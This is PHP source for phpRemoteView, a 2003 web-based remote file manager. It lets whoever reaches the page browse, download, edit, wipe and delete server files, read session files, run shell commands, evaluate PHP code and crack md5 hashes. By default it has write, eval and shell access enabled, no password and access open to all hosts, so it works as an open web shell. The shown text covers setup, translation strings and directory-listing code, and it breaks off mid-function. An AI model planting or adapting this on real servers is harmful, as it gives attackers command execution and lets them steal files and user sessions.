<?php

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 *
 *  Welcome to phpRemoteView (RemView) 
 *
 *  View/Edit remove file system:
 *  - view index of directory (/var/log - view logs, /tmp - view PHP sessions)
 *  - view name, size, owner:group, perms, modify time of files
 *  - view html/txt/image/session files
 *  - download any file and open on Notepad
 *  - create/edit/delete file/dirs
 *  - executing any shell commands and any PHP-code
 *
 *  Free download from http://php.spb.ru/remview/
 *  Version 04c, 2003-10-23. 
 *  Please, report bugs...
 *
 *  This programm for Unix/Windows system and PHP4 (or higest).
 *
 *  (c) Dmitry Borodin, dima@php.spb.ru, http://php.spb.ru
 *
 * * * * * * * * * * * * * * * * * WHATS NEW * * * * * * * * * * * * * * * *
 *
 * --version4--
 *  2003.10.23 support short <?php ?> tags, thanks A.Voropay
 *
 *  2003.04.22 read first 64Kb of null-size file (example: /etc/zero), 
 *                thanks Anight
 *             add many functions/converts: md5, decode md5 (pass crack), 
 *                date/time, base64, translit, russian charsets
 *             fix bug: read session files
 *
 *  2002.08.24 new design and images
 *             many colums in panel
 *             sort & setup panel
 *             dir tree
 *             base64 encoding
 *             character map
 *             HTTP authentication with login/pass
 *             IP-address authentication with allow hosts
 *
 * --version3--
 *  2002.08.10 add multi language support (english and russian)
 *             some update
 *
 *  2002.08.05 new: full windows support
 *             fix some bugs, thanks Jeremy Flinston
 * 
 *  2002.07.31 add file upload for create files
 *             add 'direcrory commands'
 *             view full info after safe_mode errors
 *             fixed problem with register_glogals=off in php.ini
 *             fixed problem with magic quotes in php.ini (auto strip slashes)
 *
 * --version2--
 *  2002.01.20 add panel 'TOOLS': eval php-code and run shell commands
 *             add panel 'TOOLS': eval php-code and run shell commands
 *             add copy/edit/create file (+panel 'EDIT')
 *             add only-read mode (disable write/delete and PHP/Shell)
 *
 *  2002.01.19 add delete/touch/clean/wipe file
 *             add panel 'INFO', view a/c/m-time, hexdump view
 *             add session file view mode (link 'SESSION').
 *
 *  2002.01.12 first version!
 *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

///////////////////////////////// S E T U P ///////////////////////////////////

   
   $version="2003-10-23";

   $hexdump_lines=8;        // lines in hex preview file
   $hexdump_rows=24;        // 16, 24 or 32 bytes in one line

   $mkdir_mode=0755;        // chmode for new dir ('MkDir' button)

   $maxsize_fread=65536;    // read first 64Kb from any null-size file

   // USER ACCESS //

   $write_access=true;      // true - user (you) may be write/delete files/dirs
                            // false - only read access

   $phpeval_access=true;    // true - user (you) may be execute any php-code
                            // false - function eval() disable
   
   $system_access=true;     // true - user (you) may be run shell commands
                            // false - function system() disable
   
   // AUTHORIZATION //

   $login=false;            // Login & password for access to this programm.
   $pass=false;             // Example: $login="MyLogin"; $pass="MyPaSsWoRd";
                            // Type 'login=false' for disable authorization.

   $host_allow=array("*");  // Type list of your(allow) hosts. All other - denied.
                            // Example: $host_allow=array("127.0.0.*","localhost")


///////////////////////////////////////////////////////////////////////////////


   $tmp=array();
   foreach ($host_allow as $k=>$v)
      $tmp[]=str_replace("\\*",".*",preg_quote($v));
   $s="!^(".implode("|",$tmp).")$!i";
   if (!preg_match($s,getenv("REMOTE_ADDR")) && !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) 
      exit("<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - your host not allow</h1>\n");
   if ($login!==false && (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || 
      $HTTP_SERVER_VARS['PHP_AUTH_USER']!=$login || $HTTP_SERVER_VARS['PHP_AUTH_PW']!=$pass)) {
      header("WWW-Authenticate: Basic realm=\"phpRemoteView\"");
      header("HTTP/1.0 401 Unauthorized");
      exit("<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - password erroneous</h1>\n");
   }

   error_reporting(2047);
   set_magic_quotes_runtime(0);
   @set_time_limit(0);
   @ini_set('max_execution_time',0);
   @ini_set('output_buffering',0);
   if (function_exists("ob_start") && (!isset($c) || $c!="md5crack")) ob_start("ob_gzhandler");

   $self=basename($HTTP_SERVER_VARS['PHP_SELF']);

   $url="http://".getenv('HTTP_HOST').
        (getenv('SERVER_PORT')!=80 ? ":".getenv('SERVER_PORT') : "").
        $HTTP_SERVER_VARS['PHP_SELF'].
        (getenv('QUERY_STRING')!="" ? "?".getenv('QUERY_STRING') : "");
   $uurl=urlencode($url);

   //
   // antofix 'register globals': $HTTP_GET/POST_VARS -> normal vars;
   //
   $autovars1="c d f php skipphp pre nlbr xmp htmls shell skipshell pos ".
              "ftype fnot c2 confirm text df df2 df3 df4 ref from to ".
              "fatt showfile showsize root name ref names sort sortby ".
              "datetime fontname fontname2 fontsize pan limit convert fulltime fullqty";
   foreach (explode(" ",$autovars1) as $k=>$v)  {
      if (isset($HTTP_POST_VARS[$v])) $$v=$HTTP_POST_VARS[$v];
         elseif (isset($HTTP_GET_VARS[$v])) $$v=$HTTP_GET_VARS[$v];
            //elseif (isset($HTTP_COOKIE_VARS[$v])) $$v=$HTTP_COOKIE_VARS[$v];
   }

   //
   // autofix 'magic quotes':
   //
   $autovars2="php shell text d root convert";
   if (get_magic_quotes_runtime() || get_magic_quotes_gpc()) {
      foreach (explode(" ",$autovars2) as $k=>$v) {
         if (isset($$v)) $$v=stripslashes($$v);
      }
   }

   $cp_def=array(
      "001001",
      "nst2ac",
      "d/m/y H:i",
      "Tahoma",
      "9"
      );

   $panel=0;
   if (isset($HTTP_COOKIE_VARS["cp$panel"])) 
      $cp=explode("~",$HTTP_COOKIE_VARS["cp$panel"]); 
   else 
      $cp=$cp_def;
   $cc=$cp[0];
   $cn=$cp[1];

/*

$cc / $cp[0]- список однобуквенных параметров, скопировано в $cs:
   $cc[0] - по какой колонке сортировать, а если это не цифра:
               n - по имени
               e - расширение
   $cc[1] - порядок (0 - возраст. 1 - убывающий)
   $cc[2] - показывать ли иконки
   $cc[3] - что делать при клике по иконке файла:
               0 - просмотр в text/plain
               1 - просмотр в html
               2 - download
               3 - параметры файла (info)
   $cc[4] - округлять размер файлов до Кб/Мб/Гб
   $cc[5] - язык:
               1 - английский
               2 - русски

$cn / $cp[1] - список колонок и их порядок, которые показывать, строка букв/цифр:
   t - type
   n - name
   s - size
   a - owner+group
   o - owner
   g - group
   c - chmod
   1 - create time
   2 - modify time
   3 - access time

$cp[2]: формат времени

$cp[3]: имя шрифта

$cp[4]: размер шрифта

*/

   // Как выравнивать колонки
   $cn_align=array();
   $cn_align['t']='center';
   $cn_align['n']='left';
   $cn_align['s']='right';
   $cn_align['a']='center';
   $cn_align['o']='center';
   $cn_align['g']='center';
   $cn_align['c']='center';
   $cn_align['1']='center';
   $cn_align['2']='center';
   $cn_align['3']='center';


///////////////////////////////////////////////////////////////////////////////


/*--mmstart--*/
$mm=array(
"Index of"=>"Индекс",
"View file"=>"Показ файла",
"DISK"=>"ДИСК",
"Info"=>"Инфо",
"Plain"=>"Прямой",
"HTML"=>"HTML",
"Session"=>"Сессия",
"Image"=>"Картинка",
"Notepad"=>"Блокнот",
"DOWNLOAD"=>"ЗАГРУЗИТЬ",
"Edit"=>"Правка",
"Sorry, this programm run in read-only mode."=>"Извините, эта программа работает в режиме 'только чтение'.",
"For full access: write"=>"Для полного доступа: напишите",
"in this php-file"=>"в этом php-файле",
"Reason"=>"Причина",
"Error path"=>"Ошибочный путь",
"Click here for start"=>"Нажмите для старта",
"up directory"=>"каталог выше",
"access denied"=>"доступ запрещен",
"REMVIEW TOOLS"=>"УТИЛИТЫ REMVIEW",
"version"=>"версия",
"Free download"=>"Бесплатная загрузка",
"back to directory"=>"вернуться в каталог",
"Size"=>"Размер",
"Owner"=>"Овнер",
"Group"=>"Группа",
"FileType"=>"Тип файла",
"Perms"=>"Права",
"Create time"=>"Время создания",
"Access time"=>"Время доступа",
"MODIFY time"=>"Время ИЗМЕНЕНИЯ",
"HEXDUMP PREVIEW"=>"ПРЕДПРОСМОТР В 16-РИЧНОМ ВИДЕ",
"ONLY READ ACCESS"=>"ДОСТУП ТОЛЬКО НА ЧТЕНИЕ",
"Can't READ file - access denied"=>"Не могу прочитать - доступ запрещен",
"full read/write access"=>"полный доступ на чтение/запись",
"FILE SYSTEM COMMANDS"=>"КОМАНДЫ ФАЙЛОВОЙ СИСТЕМЫ",
"EDIT"=>"РЕДАКТ.",
"FILE"=>"ФАЙЛ",
"DELETE"=>"СТЕРЕТЬ",
"Delete this file"=>"Стереть файл",
"CLEAN"=>"ОЧИСТИТЬ",
"TOUCH"=>"ОБНОВИТЬ",
"Set current 'mtime'"=>"Устан.текущ.время",
"WIPE(delete)"=>"УНИЧТОЖИТЬ",
"Write '0000..' and delete"=>"Забить нулями, стереть",
"COPY FILE"=>"КОПИРОВАТЬ ФАЙЛ",
"COPY"=>"КОПИРОВАТЬ",
"MAKE DIR"=>"СОЗДАТЬ КАТАЛОГ",
"type full path"=>"введите полный путь",
"MkDir"=>"Созд.Кат.",
"CREATE NEW FILE or override old file"=>"СОЗДАТЬ НОВЫЙ ФАЙЛ или перезаписать старый",
"CREATE/OVERRIDE"=>"СОЗДАТЬ/ПЕРЕЗАПИСАТЬ",
"select file on your local computer"=>"выбрать файл на вашем локальном компьютере",
"save this file on path"=>"сохранить этот файл в каталог",
"create file name automatic"=>"придумать имя файлу автоматически",
"OR"=>"ИЛИ",
"type any file name"=>"ввести имя файла вручную",
"convert file name to lovercase"=>"конвертировать имя в нижний регистр",
"Send File"=>"Послать файл",
"Delete all files in dir"=>"Удалить все файлы",
"Delete all dir/files recursive"=>"Удалить ВСЕ +подкаталоги рекурсивно",
"Confirm not found (go back and set checkbox)"=>"Подтверждение не поставлено (вернитесь назад и поставьте галочку)",
"Delete cancel - File not found"=>"Удаление отменено - Файл не найден",
"YES"=>"ДА",
"ME"=>"МЕНЯ",
"NO (back)"=>"НЕТ (назад)",
"Delete cancel"=>"Удаление отменено",
"ACCESS DENIED"=>"ДОСТУП ЗАПРЕЩЕН",
"done (go back)"=>"готово (назад)",
"Delete ok"=>"Ок, удаленно",
"Touch cancel"=>"Обновление отменено",
"Touch ok (set current time to 'modify time')"=>"Обновление завершено (файлу присвоено текущее время модификации)",
"Clean (empty file) cancel"=>"Очищение (обнуление файла) отменено",
"Clean ok (file now empty)"=>"Ок, очищено (файл обнулен)",
"Wipe cancel - access denied"=>"Уничтожение отменено - доступ запрещен",
"Wipe ok (file deleted)"=>"Ок, уничтожено (и файл стерт)",
"DIR"=>"DIR",
"Deleting all files in"=>"Удаление всех файлов в",
"skip"=>"пропуск",
"deleting"=>"удаление",
"Deleting all dir/files (recursive) in"=>"Удаление всех файлов/подкаталогов (рекурсивно)",
"DONE, go back"=>"ГОТОВО, назад",
"DONE"=>"ГОТОВО",
"file not found"=>"файл не найден",
"ONLY READ ACCESS (don't edit!)"=>"ДОСТУП ТОЛЬКО НА ЧТЕНИЕ (не редактировать)",
"Can't READ file - access denied (don't edit!)"=>"Не могу ЧИТАТЬ файл - доступ запрещен",
"EDIT FILE"=>"ПРАВИТЬ ФАЙЛ",
"can't open, access denied"=>"не могу открыть, доступ запрещен",
"SAVE FILE (write to disk)"=>"СОХРАНИТЬ ФАЙЛ (запись на диск)",
"You mast checked 'create file name automatic' OR typed file name!"=>"Вы должны отметить галочку [создать файл автоматически] или ввести в поле имя файла!'",
"SAVING TO"=>"СОХРАНИТЬ В",
"Sorry, access denied"=>"Извините, доступ запрещен",
"for example, uncomment next line"=>"для примера, раскомментируйте следующую строку",
"Eval PHP code"=>"Выполнить PHP код",
"don't type"=>"не пишите",
"and"=>"и",
"example (remove comments '#')"=>"пример (удалите комментарии '#')",
"Shell commands"=>"Команды Shell'a",
"filesize to 0byte"=>"размер в 0 байт",
"from"=>"от",
"to"=>"в",
"Full file name"=>"Полное имя файла",
"Can't open directory"=>"Не могу открыть каталог",
"setup"=>"настройка",
"back"=>"назад",
"Reset all settings"=>"Сбросить все настройки",
"clear"=>"очистить",
"Current"=>"Текущие",
"Colums and sort"=>"Колонки и сортировка",
"Sort order"=>"Порядок сортировки",
"Ascending sort"=>"По возрастанию",
"Descending sort"=>"По убыванию",
"Sort by filename"=>"Сортировать по имени файла",
"Sort by filename extension"=>"Сортировать по расширению файла",
"Date/time format"=>"Формат даты/времени",
"Panel font & size"=>"Шрифт/размер панели",
"Setup"=>"Опции",
"Char map"=>"Символы",
"Language"=>"Язык",
"English"=>"Английский",
"Russian"=>"Русский",
"Character map (symbol codes table)"=>"Таблица символов",
"Select font"=>"Выберите шрифт",
"or type other"=>"или введите другой",
"Font size"=>"Размер шрифта",
"Code limit"=>"Дипазон кодов",
"Generate table"=>"Сгенерировать таблицу",
"Universal convert"=>"Универсальные конвертации"
);/*--mmstop--*/




   $language=$cc[5];
   if ($language!=1 && $language!=2) $language=1;


function mm($m) {
   global $mm,$language;
   if ($language==1) return $m;
   if (isset($mm[$m])) return $mm[$m];
   else echo "<script>alert('(mm) msg not found: $m');</script>";
}


switch ($language) {
case 1:
$cn_name=array(
't'=>"Type",
'n'=>"Name",
's'=>"Size",
'o'=>"Owner",
'g'=>"Group",
'a'=>"Owner/Group",
'c'=>"Perms",
'1'=>"Create",
'2'=>"Modify",
'3'=>"Access"
);
break;
case 2:
$cn_name=array(
't'=>"Тип",
'n'=>"Имя",
's'=>"Размер",
'o'=>"Владелец",
'g'=>"Группа",
'a'=>"Владелец/Группа",
'c'=>"Права",
'1'=>"Создан",
'2'=>"Изменен",
'3'=>"Доступ"
);
break;
}




///////////////////////////////////////////////////////////////////////////////



   $rand=microtime();

   if (!isset($c)) $c="";
   if (!isset($d)) $d="";
   if (!isset($f)) $f="";

   ob();
   $d=str_replace("\\","/",$d);
   if ($d=="") $d=realpath("./")."/";
   if ($c=="") $c="l";
   if ($d[strlen($d)-1]!="/") $d.="/";
   $d=str_replace("\\","/",$d);
   if (!is_dir($d)) obb().die("<h3><P>".mm("Can't open directory")." <tt><font color=red><big>$d</big></font></tt>$obb");
   if (!realpath($d) || filetype($d)!="dir") obb().die("error dir type $obb");
   obb();

   //
   // OS detect:
   //
   $win=0;
   $unix=0;
   if (strlen($d)>1 && $d[1]==":") $win=1; else $unix=1;




///////////////////////////////////////////////////////////////////////////////


$html=<<<remview
<html><head>
<title>phpRemoteView: $d$f</title>
</head>
<body>
<style>
A {
text-decoration : none;
}
.t {
font-size: 9pt;
text-align : center;
font-family: Verdana;
}
.t2 {
font-size: 8pt;
text-align : center;
font-family: Verdana;
}
.n {
  font-family: Fixedsys
}
.s {
font-size: 10pt;
text-align : right;
font-family: Verdana;
}
.sy {
font-family: Fixedsys;
}
.s2 {
font-family: Fixedsys;
color: red;
}
.tab {
font-size: 10pt;
text-align : center;
font-family: Verdana;
background: #cccccc;
}
.tr {
background: #ffffff;
}
</style>
remview;



function display_perms($mode) 
{ 
if ($GLOBALS['win']) return 0;
/* Determine Type */ 
if( $mode & 0x1000 ) 
$type='p'; /* FIFO pipe */ 
else if( $mode & 0x2000 ) 
$type='c'; /* Character special */ 
else if( $mode & 0x4000 ) 
$type='d'; /* Directory */ 
else if( $mode & 0x6000 ) 
$type='b'; /* Block special */ 
else if( $mode & 0x8000 ) 
$type='-'; /* Regular */ 
else if( $mode & 0xA000 ) 
$type='l'; /* Symbolic Link */ 
else if( $mode & 0xC000 ) 
$type='s'; /* Socket */ 
else 
$type='u'; /* UNKNOWN */ 

/* Determine permissions */ 
$owner["read"] = ($mode & 00400) ? 'r' : '-'; 
$owner["write"] = ($mode & 00200) ? 'w' : '-'; 
$owner["execute"] = ($mode & 00100) ? 'x' : '-'; 
$group["read"] = ($mode & 00040) ? 'r' : '-'; 
$group["write"] = ($mode & 00020) ? 'w' : '-'; 
$group["execute"] = ($mode & 00010) ? 'x' : '-'; 
$world["read"] = ($mode & 00004) ? 'r' : '-'; 
$world["write"] = ($mode & 00002) ? 'w' : '-'; 
$world["execute"] = ($mode & 00001) ? 'x' : '-'; 

/* Adjust for SUID, SGID and sticky bit */ 
if( $mode & 0x800 ) 
$owner["execute"] = ($owner['execute']=='x') ? 's' : 'S'; 
if( $mode & 0x400 ) 
$group["execute"] = ($group['execute']=='x') ? 's' : 'S'; 
if( $mode & 0x200 ) 
$world["execute"] = ($world['execute']=='x') ? 't' : 'T'; 

$s=sprintf("%1s", $type); 
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']); 
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']); 
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']); 
return trim($s);
} 

function _posix_getpwuid($x) {
   if ($GLOBALS['win']) return array();
   return @posix_getpwuid($x);
}

function _posix_getgrgid($x) {
   if ($GLOBALS['win']) return array();
   return @posix_getgrgid($x);
}

function up($d,$f="",$name="") {
   global $self,$win;

   $len=strlen($d."/".$f);
   if ($len<70) { $sf1="<font size=4>"; $sf2="<font size=5>"; }
   elseif ($len<90) {$sf1="<font size=3>"; $sf2="<font size=4>";}
   else {$sf1="<font size=2>"; $sf2="<font size=3>";}

   echo "<table width=100% border=0 cellspacing=0 cellpadding=4><tr><td 
   bgcolor=#cccccc> $sf1";

   $home="<a href='$self'><font face=fixedsys size=+2>*</font></a>";
   echo $home.$sf2."<b>";
   if ($name!="") echo $name;
   else {
      if ($f=="") echo mm("Index of"); 
      else echo mm("View file");
   }
   echo "</b></font> ";
   
   $path=explode("/",$d);

   $rootdir="/";
   if ($win) $rootdir=strtoupper(substr($d,0,2))."/";

   $ss="";
   for ($i=0; $i<count($path)-1; $i++) {
      if ($i==0) 
         $comm="<b>&nbsp;&nbsp;<big><b>$rootdir</b></big></b>"; 
      else 
         $comm="$path[$i]<big><b>/</big></b>";
    
      $ss.=$path[$i]."/";
      echo "<a href='$self?c=l&d=".urlencode($ss)."'>$comm</a>";
      if ($i==0 && $d=="/") break;
   }
   echo "</font>";
   if ($f!="") echo "$sf1$f</font>";

   if ($win && strlen($d)<4 && $f=="") {
      echo " &nbsp; ".mm("DISK").": ";
      for ($i=ord('a'); $i<=ord('z'); $i++) {
         echo "<a href=$self?c=l&d=".chr($i).":/>".strtoupper(chr($i)).":</a> ";
      }   
   }

   echo "</b></big></td><td bgcolor=#999999 width=1% align=center>
   <table width=100% border=0 cellspacing=3 cellpadding=0 
   bgcolor=#ffffcc><tr><td align=center><font size=-1><nobr><b><a 
   href=$self?c=t&d=".urlencode($d).">".mm("REMVIEW TOOLS")."</a></b>
   </nobr></font></td></tr></table>
   </td></tr></table>";
}


function up_link($d,$f) {
   global $self;
   $notepad=str_replace(".","_",$f).".txt";
echo "<small>
[<a href=$self?c=i&d=".urlencode($d)."&f=".urlencode($f)."><b>".mm("Info")."</b></a>]
[<a href=$self?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=><b>".mm("Plain")."<a href=$self?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=0&fnot=1>(+)</a></b></a>]
[<a href=$self?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=1><b>".mm("HTML")."<a href=$self?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=1&fnot=1>(+)</a></b></a>]
[<a href=$self?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=4><b>".mm("Session")."</b></a>]
[<a href=$self?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=2&fnot=1><b>".mm("Image")."</b></a>]
[<a href=$self/".urlencode($notepad)."?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=3&fnot=1&fatt=".urlencode($notepad)."><b>".mm("Notepad")."</b></a>]
[<a href=$self/".urlencode($f)."?c=v&d=".urlencode($d)."&f=".urlencode($f)."&ftype=3&fnot=1><b>".mm("DOWNLOAD")."</b></a>]
[<a href=$self?c=e&d=".urlencode($d)."&f=".urlencode($f)."><b>".mm("Edit")."</b></a>]
</small>";
}


function exitw() {
exit("<table width=100% border=0 cellspacing=2 cellpadding=0 bgcolor=#ffdddd>
<tr><td align=center>
".mm("Sorry, this programm run in read-only mode.")."<br>
".mm("For full access: write")." `<tt><nobr><b>\$write_access=<u>true</u>;</b></nobr></tt>` 
".mm("in this php-file").".</td></tr></table>
");
}



function ob() {
   global $obb_flag, $obb;
   if (!isset($obb_flag)) { $obb_flag=0; $obb=false; }
   if (function_exists("ob_start")) {
      if ($GLOBALS['obb_flag']) ob_end_clean();
      ob_start();
      $GLOBALS['obb_flag']=1;
   }
}

function obb() {
   global $obb;
   if (function_exists("ob_start")) {
      $obb=ob_get_contents();
      ob_end_clean();
      $obb="<P>
<table bgcolor=#ff0000 width=100% border=0 cellspacing=1 cellpadding=0><tr><td>
<table bgcolor=#ccccff width=100% border=0 cellspacing=0 cellpadding=3><tr><td align=center>
<b>".mm("Reason").":</b></td></tr></table>
</td></tr><tr><td>
<table bgcolor=#ffcccc width=100% border=0 cellspacing=0 cellpadding=3><tr><td>
$obb<P>
</td></tr></table>
</table><P>";
      $GLOBALS['obb_flag']=0;
   }
}

function sizeparse($size) {
   return strrev(preg_replace("!...!","\\0 ",strrev($size)));
}


function jsval($msg) {
   $msg=str_replace("\\","\\\\",$msg);
   $msg=str_replace("\"","\\\"",$msg);
   $msg=str_replace("'","\\'",$msg);
   return '"'.$msg.'",';
}



///////////////////////////////////////////////////////////////////////////


switch($c) {


// listing
case "l":

   echo $GLOBALS['html'];

   if (!realpath($d)) die("".mm("Error path").". <a href=$self>".mm("Click here for start")."</a>.");

   //up($d);
   
   ob();
   $di=dir($d);
   obb();

   $dirs=array();
   $files=array();

   if (!$di) exit("<a href=$self?&c=l&d=".urlencode(realpath($d."..")).
      "><nobr>&lt;&lt;&lt; <b>".mm("up directory")."</b> &gt;&gt;&gt;</nobr></a> <p>".
      "<font color=red><b>".mm("access denied")."</b></font>: $obb");
   while (false!==($name=$di->read())) {
      if ($name=="." || $name=="..") continue;
      if (@is_dir($d.$name)) { 
         $dirs[]=strval($name);
         $fstatus[$name]=0;
      }
      else {
         $files[]=strval($name);
         $fstatus[$name]=1;
      }
      $fsize[$name]=@filesize($d.$name);
      $ftype[$name]=@filetype($d.$name);
      if (!is_int($fsize[$name])) { $ftype[$name]='?'; $fstatus[$name]=1; }
      $fperms[$name]=@fileperms($d.$name);
      $fmtime[$name]=@filemtime($d.$name);
      $fatime[$name]=@fileatime($d.$name);
      $fctime[$name]=@filectime($d.$name);
      $fowner[$name]=@fileowner($d.$name);
      $fgroup[$name]=@filegroup($d.$name);
      if (preg_match("!^[^.].*\.([^.]+)$!",$name,$ok)) 
         $fext[$name]=strtolower($ok[1]); 
      else 
         $fext[$name]="";
   }
   $di->close();

   $listsort=array();
   if (count($dirs))
   foreach ($dirs as $v) {
       switch ($cc[0]) {
          case "e": $listsort[$v]=$fext[$v].' '.$v; break;
          case "n": $listsort[$v]=strtolower($v); break;
          default:
             switch ($cn[$cc[0]]) {
                case "t": case "s": case "n": $listsort[$v]=strtolower($v); break;
                case "o": $listsort[$v]=$fowner[$v]; break;
                case "g": $listsort[$v]=$fgroup[$v]; break;
                case "a": $listsort[$v]="$fowner[$v] $fgroup[$v]"; break;
                case "c": $listsort[$v]=$fperms[$v]; break;
                case "1": $listsort[$v]=$fctime[$v]; break;
                case "2": $listsort[$v]=$fmtime[$v]; break;
                case "3": $listsort[$v]=$fatime[$v]; break;
          
             }
      }
   }

   $names=$listsort;
   //echo "<pre>";print_r($names);
   if ($cc[1]) arsort($names); else asort($names);
   //echo "<pre>";print_r($names);

   $listsort=array();
   if (count($files))
   foreach ($files as $v) {
       $v=strval($v);
       switch ($cc[0]) {
          case "e": $listsort[$v]=$fext[$v].' '.$v; break;
          case "n": $listsort[$v]=strtolower($v); break;
          default:
             switch ($cn[$cc[0]]) {
                case "n": $listsort[$v]=strtolower($v); break;
                case "t": $listsort[$v]=$ftype[$v]; break;
                case "s": $listsort[$v]=$fsize[$v]; break;
                case "o": $listsort[$v]=$fowner[$v]; break;
                case "g": $listsort[$v]=$fgroup[$v]; break;
                case "a": $listsort[$v]="$fowner[$v] $fgroup[$v]"; break;
                case "c": $listsort[$v]=$fperms[$v]; break;
                case "1": $listsort[$v]=$fctime[$v]; break;
                case "2": $listsort[$v]=$fmtime[$v]; break;
                case "3": $listsort[$v]=$fatime[$v]; break;
          
             }
      }
   }


   //echo "<pre>DIRS:"; print_r($names);
   if ($cc[1]) arsort($listsort); else asort($listsort);
   //$names=array_merge($names,$listsort);
   foreach ($listsort as $k=>$v) $names[$k]=$v;
   //echo "<pre>FILES:"; print_r($listsort);
   //echo "<pre>NAMES:"; print_r($names);

?>
<STYLE>
.title {
color: 'black';
background: #D4D0C8;
text-align: 'center';
BORDER-RIGHT:   #888888 1px outset;
BORDER-TOP:     #ffffff 2px outset;
BORDER-LEFT:    #ffffff 1px outset;
BORDER-BOTTOM:  #888888 1px outset;
}
.window {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP:    buttonhighlight 2px outset;
BORDER-LEFT:   buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
FONT: 8pt Tahoma, Verdana, Geneva, Arial, Helvetica, sans-serif;
BACKGROUND-COLOR: #D4D0C8;
CURSOR: default;
}
.window1 {
BORDER-RIGHT:  #eeeeee 1px solid;
BORDER-TOP:    #808080 1px solid;
BORDER-LEFT:   #808080 1px solid;
BORDER-BOTTOM: #eeeeee 1px solid;
FONT: 8pt Tahoma, Verdana, Geneva, Arial, Helvetica, sans-serif;
}
.line {
BORDER-RIGHT:   #cccccc 1px solid;
BORDER-TOP:     #ffffff 1px solid;
BORDER-LEFT:    #ffffff 1px solid;
BORDER-BOTTOM:  #cccccc 1px solid;
font: <?php echo $cp[4]; ?>pt <?php echo $cp[3]; ?>;
}
.line2 {
background: #ffffcc;
}
.black {color: black}
a:link.black {color: black}
a:active.black {color: black}
a:visited.black {color: black}
a:hover.black {color: #0000ff}

.white {color: white}
a:link.white{color: white}
a:active.white{color: white}
a:visited.white{color: white}
a:hover.white{color: #ffff77}

a:link     {color: #000099;}
a:active   {color: #000099;}
a:visited  {color: #990099;}
a:hover    {color: #ff0000;}
a {
CURSOR: default;
}
.windowtitle {
font: 9pt; Tahoma, Verdana, Geneva, Arial, Helvetica, sans-serif;
font-weight: bold;
color: white;
}
.sym {
font: 14px Wingdings;
}
</STYLE>

<?php

function up2($d) {
   global $win,$self;
   $d=str_replace("\\","/",$d);
   if (substr($d,-1)!="/") $d.="/";
   $d=str_replace("//","/",$d);

   $n=explode("/",$d);
   unset($n[count($n)-1]);

   $path="";
   for ($i=0; $i<count($n); $i++) {
      $path="$path$n[$i]/";
      if ($i==0) $path=strtoupper($path);
      $paths[]=$path;
   }

   $out="";
   $sum=0;
   $gr=70;
   for ($i=0; $i<count($n); $i++) {
      $out.="<a href=$self?c=l&d=".urlencode($paths[$i])." class=white>";
      if (strlen($d)>$gr && $i>0 && $i+1<count($n)) {
         if (strlen($d)-$sum>$gr) {
            $out.="••";
            $sum+=strlen($n[$i]);
         }
         else 
            $out.=$n[$i];
      }
      else 
         if ($i==0) $out.=strtoupper($n[$i]); else $out.=$n[$i];
      $out.="/</a>";

   }

   return $out;
   return "<font size=-2>$d</font>";
}

$ext=array();
$ext['html']=array('html','htm','shtml');
$ext['txt']=array('txt','ini','conf','','bat','sh','tcl','js','bak','doc','log','sfc','c','cpp','h','cfg');
$ext['exe']=array('exe','com','pif','src','lnk');
$ext['php']=array('php','phtml','php3','php4','inc');
$ext['img']=array('gif','png','jpeg','jpg','jpe','bmp','ico','tif','tiff','avi','mpg','mpeg');


   echo "\n\n\n<script>\nfunction tr(";
   for ($i=0; $i<strlen($cn); $i++) {
      echo "a$i,";
   }
   echo "x) {\ndocument.write(\"<tr bgcolor=#eeeeee";
//   echo " onMouseOver='this.style.value=\\\"line2\\\"' onMouseOut='this.style.value=\\\"line\\\"'>";
   echo " onMouseOver='this.style.backgroundColor=\\\"#FFFFCC\\\"' onMouseOut='this.style.backgroundColor=\\\"\\\"'>";
   for ($i=0; $i<strlen($cn); $i++) {
      echo '<td align='.$cn_align[$cn[$i]].' class=line ';
      switch ($cn[$i])  {
         case 's': case 'c':  case '1':  case '2':  case '3': case 't':
            echo ' nowrap'; 
      }
      echo ">";
      if ($cn[$i]!='t' && $cn[$i]!='n') echo "\xA0";
      echo "\"+a$i+\"";
      if ($cn[$i]!='t' && $cn[$i]!='n') echo "\xA0";
      echo "</td>";
   }
   echo "</tr>\");\n}";
   echo "\n\n</script>\n\n\n";


   //phpinfo();
   //echo implode(" | ",$cp);
   echo '<table border=0 cellspacing=2 cellpadding=0 bgcolor=#cccccc 
      class=window align=center width=60%><form name=main>';

   echo '<tr><td colspan='.strlen($cn).' bgcolor=#0A246A background="'.
   $self.'?c=img&name=fon&r=" class=windowtitle>';

         echo '<table width=100% border=0 cellspacing=0 cellpadding=2 class=windowtitle><tr><td>'.
         '<a href='.$self.'><img src='.$self.'?c=img&name=dir border=0></a>'.
         up2($d.$f).'</td></tr></table>';

   echo '</td></tr>'.
   '<tr><td>'.
   '<table width=100% border=0 cellspacing=0 cellpadding=0 class=window1><tr>';

   $button_help=array(
   'up'=>"UP DIR",
   'refresh'=>"RELOAD",
   'mode'=>'SETUP, folder option',
   'edit'=>'DIR INFO',
   'home'=>'HomePage',
   'papki'=>'TREE',
   'setup'=>'PHP eval, Shell',
   'back'=>'BACK',
   );

   function button_url($name) {
      global $self,$d,$f,$uurl;
      switch ($name) {
         case 'up': return "$self?c=l&d=".urlencode(realpath($d.".."));
         case 'refresh': return "$self?c=l&r=".rand(0,10000)."&d=".urlencode($d);
         case 'mode': return "$self?c=setup&ref=$uurl";
         case 'edit': return "$self?c=d&d=".urlencode($d);
